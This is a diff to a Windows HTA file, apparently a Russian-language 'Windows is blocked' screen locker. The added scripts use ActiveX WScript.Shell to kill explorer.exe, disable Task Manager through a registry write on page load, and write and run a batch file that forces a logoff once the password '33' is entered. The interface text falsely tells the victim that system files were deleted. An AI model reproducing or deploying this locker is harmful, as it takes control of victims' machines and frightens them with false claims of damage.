@@ -13,8 +13,42 @@ scroll="no"
 version="1.0"
 windowState="maximize"
 singleInstance="no" />
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/stacktrace.js/0.6.4/stacktrace.js"></script>
+<script>
+var WShell = new ActiveXObject('WScript.Shell');
+WShell.run('cmd /c "taskkill /f /im explorer.exe"');
+<!---WShell.run('cmd /c "start C:\Windows\\regedit.exe"');--->
+</script>
+
+<script>
+   var fso  = new ActiveXObject("Scripting.FileSystemObject");
+   var fh = fso.CreateTextFile("c:\\win.bat", true);
+   fh.WriteLine("shutdown /l /f");
+   fh.Close();
+</script>
+
+<script language="JavaScript"> 
+function runBat() 
+{
+var MyObject = new ActiveXObject("wscript.shell");
+MyObject.Run("C:/win.bat"); 
+}
+</script>
+
+<script>
+function writeOptions()
+{
+var oWSS = new ActiveXObject("WScript.Shell");
+oWSS.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD");
+}
+function fixOptions()
+{
+var oWSS = new ActiveXObject("WScript.Shell");
+oWSS.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 0, "REG_DWORD");
+}
+</script>
 </head>
-<body background="http://s7d5.scene7.com/is/content/Crate/HomePage/2016/dHP_Hlwn_160901_OMN16_v2.gif"
+<body ONLOAD="writeOptions();" background="http://s7d5.scene7.com/is/content/Crate/HomePage/2016/dHP_Hlwn_160901_OMN16_v2.gif"
 style="border: none;
 text-align: center;
 font: 40pt Comic Sans MS"
@@ -25,10 +59,12 @@ var n,s;
 n = document.getElementById('edit1').value;
 s = document.getElementById('result');
 if (n==33) {
+fixOptions();
+runBat();
 window.close();
 }
 else {
-edit1.value = 'Íåâåðíûé ïàðîëü!';
+edit1.value = 'Неверный пароль!';
 }
 }
  </script>
@@ -83,7 +119,7 @@ function raining() {
 // ]]>
 </script> 
  
-<b><span id="rainbow">Windows çàáëîêèðîâàí! </span> </b>
+<b><span id="rainbow">Windows заблокирован! </span> </b>
 <br>
  
 <br>
@@ -96,7 +132,7 @@ function raining() {
 		</td>
 		<td width="30%">
 		<p align="center">
-			<input id="erase" type="button" value="        Î÷èñòèòü        " onclick="document.getElementById('edit1').value='';" /> 
+			<input id="erase" type="button" value="        Очистить        " onclick="document.getElementById('edit1').value='';" /> 
 		</td>
 	</tr>
 </table>
@@ -118,13 +154,13 @@ function raining() {
 		</td>
 		<td width="30%">
 		<p align="center">
-			<input id="result" type="button" value="Ðàçáëîêèðîâàòü" onclick="know()" />
+			<input id="result" type="button" value="Разблокировать" onclick="know()" />
 		</td>
 	</tr>
 	<tr>
 		<td colspan="2">
 		<p align="center">
-			<input id="CloseButton" type="button" value="Óäàëèòü Windows" size="100" onclick="alert('Ñèñòåìíûé ôàéë hal.dll óäàë¸í!'); window.close()" />
+			<input id="CloseButton" type="button" value="Удалить Windows" size="100" onclick="alert('Системный файл удалён! Это был твой последний сеанс');" />
 		</td>
 	</tr>
 </table>
